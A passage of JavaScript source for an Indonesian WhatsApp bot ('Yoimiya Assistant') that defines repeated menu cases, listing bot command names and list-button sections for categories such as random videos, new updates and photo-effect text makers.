            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'randomvideomenubutton': {
let teks =`┏『 *\`乂 ʀ ᴀ ɴ ᴅ ᴏ ᴍ - ᴠ ɪ ᴅ ᴇ ᴏ 乂\`* 』━◧
║◦ *${prefix}tiktokgirl*
║◦ *${prefix}tiktoknukthy*
║◦ *${prefix}tiktokkayes*
║◦ *${prefix}tiktokpanrika*
║◦ *${prefix}tiktoknotnot*
║◦ *${prefix}tiktokghea*
║◦ *${prefix}tiktoksantuy*
║◦ *${prefix}tiktokbocil*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'newupdatebutton': {
let teks =`┏『 *\`乂 ɴ ᴇ ᴡ - ᴜ ᴘ ᴅ ᴀ ᴛ ᴇ 乂\`* 』━◧
║◦ *${prefix}nglspam*
║◦ *${prefix}bratvideo*
║◦ *${prefix}nulishitam*
║◦ *${prefix}chord*
║◦ *${prefix}readmore*
║◦ *${prefix}mcmap*
║◦ *${prefix}aigen*
║◦ *${prefix}romchat*
║◦ *${prefix}animebrat*
║◦ *${prefix}animebrat-vid*
║◦ *${prefix}totalchat*
║◦ *${prefix}hytamkan*
┗━━━━━━━━━━━━━⊱ `
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'ephoto360menubutton': {
 let teks =`┏━『 *\`乂 ᴇ ᴘ ʜ ᴏ ᴛ ᴏ - ᴍ ᴀ ᴋ ᴇ ʀ 乂\`* 』━◧
║◦ *${prefix}glitchtext*
║◦ *${prefix}writetext*
║◦ *${prefix}advancedglow*
║◦ *${prefix}typographytext*
║◦ *${prefix}pixelglitch*
║◦ *${prefix}neonglitch*
║◦ *${prefix}flagtext*
║◦ *${prefix}flag3dtext*
║◦ *${prefix}deletingtext*
║◦ *${prefix}blackpinkstyle*
║◦ *${prefix}glowingtext*
║◦ *${prefix}underwatertext*
║◦ *${prefix}logomaker*
║◦ *${prefix}cartoonstyle*
║◦ *${prefix}papercutstyle*
║◦ *${prefix}watercolortext*
║◦ *${prefix}effectclouds*
║◦ *${prefix}blackpinklogo*
║◦ *${prefix}gradienttext*
║◦ *${prefix}summerbeach*
║◦ *${prefix}luxurygold*
║◦ *${prefix}multicoloredneon*
║◦ *${prefix}sandsummer*
║◦ *${prefix}galaxywallpaper*
║◦ *${prefix}1917style*
║◦ *${prefix}makingneon*
║◦ *${prefix}royaltext*
║◦ *${prefix}freecreate*
║◦ *${prefix}galaxystyle*
║◦ *${prefix}lighteffects*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
